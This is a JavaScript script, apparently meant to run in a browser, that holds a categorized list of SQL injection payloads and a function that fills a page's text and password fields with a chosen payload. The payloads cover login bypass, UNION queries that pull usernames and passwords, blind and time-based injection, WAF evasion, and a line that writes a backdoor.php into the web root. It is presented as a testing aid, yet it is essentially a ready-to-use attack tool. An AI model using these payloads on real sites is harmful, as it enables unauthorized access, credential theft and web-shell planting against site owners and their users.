    // Common SQL Injection payloads
    const sqlPayloads = [
        // 🔹 Basic Authentication Bypass
        "' OR '1'='1' --",
        "' OR '1'='1' #",
        "' OR '1'='1'/*",
        "' OR 1=1 --",
        "' OR 1=1 #",
        "' OR 1=1/*",
        "admin' --",
        "admin' #",
        "admin'/*",
        "' OR '1'='1' AND 'x'='x' --",
        
        // 🔹 UNION-Based SQL Injection
        "' UNION SELECT 1,2,3,4 --",
        "' UNION SELECT NULL,NULL,NULL --",
        "' UNION SELECT username, password FROM users --",
        "' UNION SELECT table_name FROM information_schema.tables --",
        "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --",
        
        // 🔹 Error-Based SQL Injection
        "' AND 1=CONVERT(int, (SELECT @@version)) --",
        "' OR 1=1 GROUP BY columnnames HAVING 1=1 --",
        "' OR CAST(1 AS int) = CAST('A' AS int) --",
        
        // 🔹 Boolean-Based Blind SQL Injection
        "' AND 1=1 --",
        "' AND 1=2 --",
        "' AND 1=1#",
        "' AND 1=2#",
        
        // 🔹 Time-Based Blind SQL Injection
        "' OR IF(1=1, SLEEP(5), 0) --",
        "' OR BENCHMARK(5000000,MD5(1)) --",
        "'; WAITFOR DELAY '00:00:05' --",
        
        // 🔹 Extract Database & Table Names
        "' UNION SELECT database() --",
        "' UNION SELECT schema_name FROM information_schema.schemata --",
        "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() --",
        "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --",
        "' UNION SELECT username, password FROM users --",
        
        // 🔹 WAF Bypass Payloads
        "'/**/OR/**/1=1/**/--",
        "'UnIoN/**/SeLeCt/**/1,2,3/**/--",
        "'oR/**/1=1 --",
        
        // 🔹 Encoding Payloads (URL Encoding)
        "%27%20OR%20%271%27%3D%271",
        "' OR '1'='1'--",
        "' OR '1'='1'-- -",
        
        // 🔹 Privilege Escalation
        "' UNION SELECT user(), database(), version() --",
        "' UNION SELECT user FROM mysql.user --",
        
        // 🔹 Write File to Server
        "' INTO OUTFILE '/var/www/html/backdoor.php' --"
    ];
    // Function to inject SQL payload into form fields
    function injectSQL() {
        const inputs = document.querySelectorAll("input[type='text'], input[type='password'], textarea");

        if (inputs.length === 0) {
            alert("❌ No input fields found for SQL Injection testing.");
            console.warn("No input fields found.");
            return;
        }

        // Ask the user to choose a payload
        const selectedPayload = prompt("Enter the SQL payload number:\n\n" + 
            sqlPayloads.map((p, i) => `[${i + 1}] ${p}`).join("\n") + 
            "\n\nEnter the number:");

        const index = parseInt(selectedPayload, 10) - 1;

        if (isNaN(index) || index < 0 || index >= sqlPayloads.length) {
            alert("❌ Invalid selection. No injection performed.");
            return;
        }

        // Inject selected payload
        inputs.forEach(input => {
            input.value = sqlPayloads[index];
        });

        alert("✅ SQL Injection payload injected successfully!");

        // Find form but do NOT submit automatically
        const form = document.querySelector("form");
        if (form) {
            alert("🚀 Form is ready for submission! Click Submit manually.");
            console.log("SQL Injection test applied. User must submit the form manually.");
        } else {
            alert("⚠️ No form found for submission.");
            console.warn("No form found for submission.");
        }
    }

    // Execute the function
    injectSQL();
